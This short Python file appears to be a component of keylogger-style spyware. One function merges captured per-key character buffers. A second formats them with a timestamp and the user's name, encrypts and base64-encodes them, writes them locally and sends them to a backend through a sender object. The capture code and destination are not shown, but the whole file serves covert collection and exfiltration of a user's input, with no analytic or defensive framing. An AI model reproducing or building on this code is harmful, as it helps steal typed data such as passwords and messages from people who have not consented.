import time
import base64
def merge(buffer, keys):
    for key, value in keys.items():
        if key in buffer:
            buffer[key] += value  # append values
        else:
            buffer[key] = value[:]  # create new key with a copy of the list

    return buffer


def send_buffer(buffer, encryptor, writer, sender, Systeminfo, encryption_key):
    """Helper to encrypt + send + write buffer"""
    data = " | ".join(f"{k}: {''.join(v)}" for k, v in buffer.items())  # format keys
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")                      # current time
    data = f"[{timestamp}] \n [user name: {Systeminfo['username']}] \n{data}"
    encrypted_bytes = encryptor.encrypt(data)                           # encrypt text
    encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")   # convert to base64

    writer.write_data(encrypted_b64)                                    # save locally
    sender.send_data(encrypted_b64, Systeminfo, encryption_key)         # send to backend